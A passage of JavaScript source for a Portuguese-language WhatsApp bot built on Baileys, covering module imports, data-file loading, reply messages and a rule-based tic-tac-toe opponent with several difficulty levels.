/*Olá usuário..
Este bot foi criado para o uso sem fins lucrativos
Criador: Italu
Colaboradores: Resen e Toin
*/

//_API WHATSAPP WEB
const { WAConnection, MessageType, Presence, Mimetype, GroupSettingChange, MessageOptions, WALocationMessage, WA_MESSAGE_STUB_TYPES, WA_DEAFULT_EPHEMERAL, ReconnectMode, ProxyAgent, waChatKey, mentionedJid, processTime, ChatModification } = require('@adiwajshing/baileys');

//_MÓDULOS NPM
const ytdl = require('ytdl-core');
const yts = require('yt-search');
const ytsr = require('ytsr');
const got = require('got');
const fs = require('fs');
const ID3Writer = require('browser-id3-writer')
const moment = require('moment-timezone');
const { exec, spawn } = require('child_process');
const kagApi = require('@kagchi/kag-api');
const fetc = require('node-fetch');
const ffmpeg = require('fluent-ffmpeg');
const { removeBackgroundFromImageFile } = require('remove.bg');
const imgbb = require('imgbb-uploader');
const lolis = require('lolis.life');
const loli = new lolis();
const speed = require('performance-now');
const cd = 4.32e+7 ;
const qrcode = require("qrcode-terminal");
const crypto = require('crypto');
const axios = require('axios').default;
const imageToBase64 = require('image-to-base64');
const googleImage = require('g-i-s');

//_ARQUIVOS DA LIB
const {color, bgcolor} = require('./lib/color');
const {fetchJson} = require('./lib/fetcher');
const {recognize} = require('./lib/ocr');
const {wait, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close, addATM, addKoinUser, checkATMuser, temporizador } = require('./lib/functions');
const { webp2gifFile } = require("./lib/gif.js")
const { cmdadd } = require('./lib/totalcmd.js')
const { getRegisterNo, getRegisterName, getRegisterSerial, getRegisterAge, getRegisterTime, getRegisteredRandomId, addRegisteredUser, createSerial, checkRegisteredUser } = require('./lib/register.js')
const { getLevelingXp, getLevelingId, addLevelingXp, addLevelingLevel, addLevelingId, getLevelingLevel, getUserRank, addCooldown } = require('./lib/leveling.js')
const { addTTTId, addTTTwin, addTTTdefeat, addTTTtie, addTTTpoints, getTTTId, getTTTwins, getTTTdefeats, getTTTties, getTTTpoints } = require('./lib/tictactoe.js')//JOGO DA VELHA,AGRADECIMENTOS: IRIS(kill), Resen
const { addLimit, getLimit } = require('./lib/limit.js')// LIMITADOR, AGRADECIMENTOS: IRIS(kill), Resen
const { addMetadata } = require('./lib/exif.js')


//_JSON GRUPO/CONFIGURAÇÕES
const dnsnew = fs.readFileSync('./src/dragonser.jpg')
const dnsnewx = fs.readFileSync('./xmenu.jpeg')
const nsfw = JSON.parse(fs.readFileSync('./data/nsfw.json'));
const welkom = JSON.parse(fs.readFileSync('./data/welkom.json'));
const z24 = JSON.parse(fs.readFileSync('./data/zm.json'))
const _leveling = JSON.parse(fs.readFileSync('./data/leveling.json'));

//_JSON INFORMAÇÕES DO USUÁRIO
const _level = JSON.parse(fs.readFileSync('./datauser/level.json'));
const _registered = JSON.parse(fs.readFileSync('./datauser/registered.json'));
const uang = JSON.parse(fs.readFileSync('./datauser/uang.json'));
const ban = JSON.parse(fs.readFileSync('./datauser/banned.json'));
const prem = JSON.parse(fs.readFileSync('./datauser/premium.json'));

//_ OUTROS ARQUIVOS DO BOT
const tictactoe = JSON.parse(fs.readFileSync('./database/ttt/tictactoe.json'));
const daily = JSON.parse(fs.readFileSync('./data/diario.json'))
const { msgFilter, isUrl } = require('./utils')
const sotoy = JSON.parse(fs.readFileSync('./data/sotoy.json'))
const { ptbr } = require('./mess')
const totalcmd = JSON.parse(fs.readFileSync('./data/totalcmd.json'))[0].totalcmd
const { Exkey } = JSON.parse(fs.readFileSync('./data/apikey.json')) 
/*👆API KEY EX TEAM👆 adquira a sua key com*/o = 'wa.me/+558598669655'

//_INFORMAÇÕES DO BOT(settings)
const infos = JSON.parse(fs.readFileSync('./data/settings.json'))
const { prefix, ownerName, ownerNumber, cdd, ammOff, cr, crfig, crlv, crtt, crh } = infos
const prefix2 = ">"
const blocked = []
const Exif = require('./lib/exifi')
const exifi = new Exif()
mess = {
			wait: '\`\`\`⊷️「 Wait a minute 」\`\`\`',
			success: '\`\`\`⊷️「 Success 」\`\`\`',
			error: {
				stick: '\`\`\`⊷️「 Cannot access videos! 」\`\`\`',
				Iv: '\`\`\`⊷️「 Invalid link! 」\`\`\`',
                api: '\`\`\`⊷️「 Error 」\`\`\`'
			},
			only: {
				group: '\`\`\`⊷️「 Only for within the group! 」\`\`\`',
				ownerG: '\`\`\`⊷️「 Only for group owners! 」\`\`\`',
				ownerB: '\`\`\`⊷️「 Only for bot owners! 」\`\`\`',
				admin: '\`\`\`⊷️「 Only for group admins! 」\`\`\`',
				Badmin: '\`\`\`⊷️「 Make the bot a group admin! 」\`\`\`'
			}
		}
//_VCARD DONO DO BOT
const vcard = 'BEGIN:VCARD\n' 
            + 'VERSION:3.0\n' 
            + 'FN: 𔑪ᴅʀᴀͥɢᴏᷧɴͫ♾ʟͣ𝖔ᷩ𝖔ͥ𝖕ᷡ𓆨⁩⁩⁩⁩⁩\n' 
            + 'ORG:ᴏᴡɴᴇr ᴡᴀʟᴋᴇr;\n' 
            + 'TEL;type=CELL;type=VOICE;waid=919446088620:+919446088620\n' 
            + 'END:VCARD'

//_TIC-TAC-TOE By: Resen
const { ttthelp } = require('./database/ttt/TTTconfig/ttthelp');
const { tttme } = require('./database/ttt/TTTconfig/tttme');
var tttset = require('./database/ttt/TTTconfig/tttset.json');
var esp = require('./database/ttt/TTTconfig/tttframe.json');

//_TESTE PARA VITÓRIA DE ❌
const WinnerX = () => {
	if (
		(esp.a1=="❌"&&esp.a2=="❌"&&esp.a3=="❌") || (esp.b1=="❌"&&esp.b2=="❌"&&esp.b3=="❌") || (esp.c1=="❌"&&esp.c2=="❌"&&esp.c3=="❌") || 
		(esp.a1=="❌"&&esp.b1=="❌"&&esp.c1=="❌") || (esp.a2=="❌"&&esp.b2=="❌"&&esp.c2=="❌") || (esp.a3=="❌"&&esp.b3=="❌"&&esp.c3=="❌") ||
		(esp.a1=="❌"&&esp.b2=="❌"&&esp.c3=="❌") || (esp.a3=="❌"&&esp.b2=="❌"&&esp.c1=="❌")
	) {
		return true
	} else {
		return false
	}
}

//TESTE PARA VITÓRIA DE ⭕
const WinnerO = () => {
	if (
		(esp.a1=="⭕"&&esp.a2=="⭕"&&esp.a3=="⭕") || (esp.b1=="⭕"&&esp.b2=="⭕"&&esp.b3=="⭕") || (esp.c1=="⭕"&&esp.c2=="⭕"&&esp.c3=="⭕") || 
		(esp.a1=="⭕"&&esp.b1=="⭕"&&esp.c1=="⭕") || (esp.a2=="⭕"&&esp.b2=="⭕"&&esp.c2=="⭕") || (esp.a3=="⭕"&&esp.b3=="⭕"&&esp.c3=="⭕") ||
		(esp.a1=="⭕"&&esp.b2=="⭕"&&esp.c3=="⭕") || (esp.a3=="⭕"&&esp.b2=="⭕"&&esp.c1=="⭕")
	) {
		return true
	} else {
		return false
	}
}

//TESTE PARA EMPATE
const Tie = () => {
	if (esp.a1!="🔲"&&esp.a2!="🔲"&&esp.a3!="🔲"&&esp.b1!="🔲"&&esp.b2!="🔲"&&esp.b3!="🔲"&&esp.c1!="🔲"&&esp.c2!="🔲"&&esp.c3!="🔲") {
		return true
	} else {
		return false
	}
}

const IA = () => {
    if (WinnerX() || WinnerO() || Tie()) {
		tttset.reActivate1 = "off"
//INICIO DO MODO IMPOSSIVEL
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" && ( 
		//TESTE PARA TENTATIVA DE VITÓRIA
		(esp.a1=="⭕"&&esp.a2=="⭕"&&esp.a3=="🔲") || (esp.a1=="⭕"&&esp.a2=="🔲"&&esp.a3=="⭕") || (esp.a1=="🔲"&&esp.a2=="⭕"&&esp.a3=="⭕") ||
		(esp.b1=="⭕"&&esp.b2=="⭕"&&esp.b3=="🔲") || (esp.b1=="⭕"&&esp.b2=="🔲"&&esp.b3=="⭕") || (esp.b1=="🔲"&&esp.b2=="⭕"&&esp.b3=="⭕") ||
		(esp.c1=="⭕"&&esp.c2=="⭕"&&esp.c3=="🔲") || (esp.c1=="⭕"&&esp.c2=="🔲"&&esp.c3=="⭕") || (esp.c1=="🔲"&&esp.c2=="⭕"&&esp.c3=="⭕") ||
		(esp.a1=="⭕"&&esp.b1=="⭕"&&esp.c1=="🔲") || (esp.a1=="⭕"&&esp.b1=="🔲"&&esp.c1=="⭕") || (esp.a1=="🔲"&&esp.b1=="⭕"&&esp.c1=="⭕") ||
		(esp.a2=="⭕"&&esp.b2=="⭕"&&esp.c2=="🔲") || (esp.a2=="⭕"&&esp.b2=="🔲"&&esp.c2=="⭕") || (esp.a2=="🔲"&&esp.b2=="⭕"&&esp.c2=="⭕") ||
		(esp.a3=="⭕"&&esp.b3=="⭕"&&esp.c3=="🔲") || (esp.a3=="⭕"&&esp.b3=="🔲"&&esp.c3=="⭕") || (esp.a3=="🔲"&&esp.b3=="⭕"&&esp.c3=="⭕") ||
		(esp.a1=="⭕"&&esp.b2=="⭕"&&esp.c3=="🔲") || (esp.a1=="⭕"&&esp.b2=="🔲"&&esp.c3=="⭕") || (esp.a1=="🔲"&&esp.b2=="⭕"&&esp.c3=="⭕") ||
		(esp.a3=="⭕"&&esp.b2=="⭕"&&esp.c1=="🔲") || (esp.a3=="⭕"&&esp.b2=="🔲"&&esp.c1=="⭕") || (esp.a3=="🔲"&&esp.b2=="⭕"&&esp.c1=="⭕") ||
		//TESTE PARA TENTATIVA DE BLOQUEIO
		(esp.a1=="❌"&&esp.a2=="❌"&&esp.a3=="🔲") || (esp.a1=="❌"&&esp.a2=="🔲"&&esp.a3=="❌") || (esp.a1=="🔲"&&esp.a2=="❌"&&esp.a3=="❌") ||
		(esp.b1=="❌"&&esp.b2=="❌"&&esp.b3=="🔲") || (esp.b1=="❌"&&esp.b2=="🔲"&&esp.b3=="❌") || (esp.b1=="🔲"&&esp.b2=="❌"&&esp.b3=="❌") ||
		(esp.c1=="❌"&&esp.c2=="❌"&&esp.c3=="🔲") || (esp.c1=="❌"&&esp.c2=="🔲"&&esp.c3=="❌") || (esp.c1=="🔲"&&esp.c2=="❌"&&esp.c3=="❌") ||
		(esp.a1=="❌"&&esp.b1=="❌"&&esp.c1=="🔲") || (esp.a1=="❌"&&esp.b1=="🔲"&&esp.c1=="❌") || (esp.a1=="🔲"&&esp.b1=="❌"&&esp.c1=="❌") ||
		(esp.a2=="❌"&&esp.b2=="❌"&&esp.c2=="🔲") || (esp.a2=="❌"&&esp.b2=="🔲"&&esp.c2=="❌") || (esp.a2=="🔲"&&esp.b2=="❌"&&esp.c2=="❌") ||
		(esp.a3=="❌"&&esp.b3=="❌"&&esp.c3=="🔲") || (esp.a3=="❌"&&esp.b3=="🔲"&&esp.c3=="❌") || (esp.a3=="🔲"&&esp.b3=="❌"&&esp.c3=="❌") ||
		(esp.a1=="❌"&&esp.b2=="❌"&&esp.c3=="🔲") || (esp.a1=="❌"&&esp.b2=="🔲"&&esp.c3=="❌") || (esp.a1=="🔲"&&esp.b2=="❌"&&esp.c3=="❌") ||
		(esp.a3=="❌"&&esp.b2=="❌"&&esp.c1=="🔲") || (esp.a3=="❌"&&esp.b2=="🔲"&&esp.c1=="❌") || (esp.a3=="🔲"&&esp.b2=="❌"&&esp.c1=="❌")
	)){
		tttset.reActivate1 = "off"
		IAmove1()
	//JOGADAS PROGRAMADAS ABAIXO
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
              ((esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "❌" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "❌" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "❌" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲"))) {
     	  tttset.reActivate1 = "off"
          esp.a1 = "⭕"
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
              ((esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "❌" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "❌" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲"))) {
          tttset.reActivate1 = "off"
          esp.a2 = "⭕"
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
              ((esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "❌") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "❌" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "❌" && esp.c3 == "⭕") ||
               (esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌"))) {
          tttset.reActivate1 = "off"
          esp.a3 = "⭕"
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
              ((esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "❌" && esp.c3 == "🔲") ||
               (esp.a1 == "⭕" && esp.a2 == "❌" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌"))) {
          tttset.reActivate1 = "off"
          esp.b1 = "⭕"
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
              ((esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "❌" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "❌" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "❌" && esp.c3 == "⭕") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "❌" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
               (esp.a1 == "⭕" && esp.a2 == "❌" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "❌" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "❌" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "❌" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
               (esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "❌" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "❌" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "❌" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
               (esp.a1 == "🔲" && esp.a2 == "❌" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
               (esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "❌" && esp.c3 == "🔲") ||
               (esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "❌" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "❌" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "❌" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲"))) {
          tttset.reActivate1 = "off"
          esp.b2 = "⭕"
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
              ((esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "❌" && esp.c3 == "⭕") ||
               (esp.a1 == "🔲" && esp.a2 == "❌" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲"))) {
          tttset.reActivate1 = "off"
          esp.b3 = "⭕"
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
              ((esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "❌" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "❌" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
               (esp.a1 == "⭕" && esp.a2 == "❌" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌"))) {
          tttset.reActivate1 = "off"
          esp.c1 = "⭕"
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
              ((esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "❌" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "❌" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕"))) {
          tttset.reActivate1 = "off"
          esp.c2 = "⭕"
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
		    ((esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "❌" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "❌" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "❌" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲"))) {
          tttset.reActivate1 = "off"
          esp.c3 = "⭕"
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" && (esp.a1 ==  "🔲" || esp.a3 ==  "🔲" || esp.b2 ==  "🔲" || esp.c1 ==  "🔲" || esp.c3 ==  "🔲")) {
		//PRIORIZAR CANTOS E CENTRO
		tttset.reActivate1 = "off"
		while (tttset.reActivate3 == "on") {
			priorityC()
		}
		tttset.reActivate3 = "on"
//FIM DO MODO IMPOSSIVEL
	} else if (tttset.tttdifficulty == "HARD" && ( 
		//TESTE PARA TENTATIVA DE VITÓRIA
		(esp.a1=="⭕"&&esp.a2=="⭕"&&esp.a3=="🔲") || (esp.a1=="⭕"&&esp.a2=="🔲"&&esp.a3=="⭕") || (esp.a1=="🔲"&&esp.a2=="⭕"&&esp.a3=="⭕") ||
		(esp.b1=="⭕"&&esp.b2=="⭕"&&esp.b3=="🔲") || (esp.b1=="⭕"&&esp.b2=="🔲"&&esp.b3=="⭕") || (esp.b1=="🔲"&&esp.b2=="⭕"&&esp.b3=="⭕") ||
		(esp.c1=="⭕"&&esp.c2=="⭕"&&esp.c3=="🔲") || (esp.c1=="⭕"&&esp.c2=="🔲"&&esp.c3=="⭕") || (esp.c1=="🔲"&&esp.c2=="⭕"&&esp.c3=="⭕") ||
		(esp.a1=="⭕"&&esp.b1=="⭕"&&esp.c1=="🔲") || (esp.a1=="⭕"&&esp.b1=="🔲"&&esp.c1=="⭕") || (esp.a1=="🔲"&&esp.b1=="⭕"&&esp.c1=="⭕") ||
		(esp.a2=="⭕"&&esp.b2=="⭕"&&esp.c2=="🔲") || (esp.a2=="⭕"&&esp.b2=="🔲"&&esp.c2=="⭕") || (esp.a2=="🔲"&&esp.b2=="⭕"&&esp.c2=="⭕") ||
		(esp.a3=="⭕"&&esp.b3=="⭕"&&esp.c3=="🔲") || (esp.a3=="⭕"&&esp.b3=="🔲"&&esp.c3=="⭕") || (esp.a3=="🔲"&&esp.b3=="⭕"&&esp.c3=="⭕") ||
		(esp.a1=="⭕"&&esp.b2=="⭕"&&esp.c3=="🔲") || (esp.a1=="⭕"&&esp.b2=="🔲"&&esp.c3=="⭕") || (esp.a1=="🔲"&&esp.b2=="⭕"&&esp.c3=="⭕") ||
		(esp.a3=="⭕"&&esp.b2=="⭕"&&esp.c1=="🔲") || (esp.a3=="⭕"&&esp.b2=="🔲"&&esp.c1=="⭕") || (esp.a3=="🔲"&&esp.b2=="⭕"&&esp.c1=="⭕") ||
		//TESTE PARA TENTATIVA DE BLOQUEIO
		(esp.a1=="❌"&&esp.a2=="❌"&&esp.a3=="🔲") || (esp.a1=="❌"&&esp.a2=="🔲"&&esp.a3=="❌") || (esp.a1=="🔲"&&esp.a2=="❌"&&esp.a3=="❌") ||
		(esp.b1=="❌"&&esp.b2=="❌"&&esp.b3=="🔲") || (esp.b1=="❌"&&esp.b2=="🔲"&&esp.b3=="❌") || (esp.b1=="🔲"&&esp.b2=="❌"&&esp.b3=="❌") ||
		(esp.c1=="❌"&&esp.c2=="❌"&&esp.c3=="🔲") || (esp.c1=="❌"&&esp.c2=="🔲"&&esp.c3=="❌") || (esp.c1=="🔲"&&esp.c2=="❌"&&esp.c3=="❌") ||
		(esp.a1=="❌"&&esp.b1=="❌"&&esp.c1=="🔲") || (esp.a1=="❌"&&esp.b1=="🔲"&&esp.c1=="❌") || (esp.a1=="🔲"&&esp.b1=="❌"&&esp.c1=="❌") ||
		(esp.a2=="❌"&&esp.b2=="❌"&&esp.c2=="🔲") || (esp.a2=="❌"&&esp.b2=="🔲"&&esp.c2=="❌") || (esp.a2=="🔲"&&esp.b2=="❌"&&esp.c2=="❌") ||
		(esp.a3=="❌"&&esp.b3=="❌"&&esp.c3=="🔲") || (esp.a3=="❌"&&esp.b3=="🔲"&&esp.c3=="❌") || (esp.a3=="🔲"&&esp.b3=="❌"&&esp.c3=="❌") ||
		(esp.a1=="❌"&&esp.b2=="❌"&&esp.c3=="🔲") || (esp.a1=="❌"&&esp.b2=="🔲"&&esp.c3=="❌") || (esp.a1=="🔲"&&esp.b2=="❌"&&esp.c3=="❌") ||
		(esp.a3=="❌"&&esp.b2=="❌"&&esp.c1=="🔲") || (esp.a3=="❌"&&esp.b2=="🔲"&&esp.c1=="❌") || (esp.a3=="🔲"&&esp.b2=="❌"&&esp.c1=="❌")
	)){
		//HARD
		tttset.reActivate1 = "off"
		IAmove1()
	} else if (tttset.tttdifficulty == "NORMAL" && ( 
		//TESTE PARA TENTATIVA DE VITÓRIA
		(esp.a1=="⭕"&&esp.a2=="⭕"&&esp.a3=="🔲") || (esp.a1=="⭕"&&esp.a2=="🔲"&&esp.a3=="⭕") || (esp.a1=="🔲"&&esp.a2=="⭕"&&esp.a3=="⭕") ||
		(esp.b1=="⭕"&&esp.b2=="⭕"&&esp.b3=="🔲") || (esp.b1=="⭕"&&esp.b2=="🔲"&&esp.b3=="⭕") || (esp.b1=="🔲"&&esp.b2=="⭕"&&esp.b3=="⭕") ||
		(esp.c1=="⭕"&&esp.c2=="⭕"&&esp.c3=="🔲") || (esp.c1=="⭕"&&esp.c2=="🔲"&&esp.c3=="⭕") || (esp.c1=="🔲"&&esp.c2=="⭕"&&esp.c3=="⭕") ||
		(esp.a1=="⭕"&&esp.b1=="⭕"&&esp.c1=="🔲") || (esp.a1=="⭕"&&esp.b1=="🔲"&&esp.c1=="⭕") || (esp.a1=="🔲"&&esp.b1=="⭕"&&esp.c1=="⭕") ||
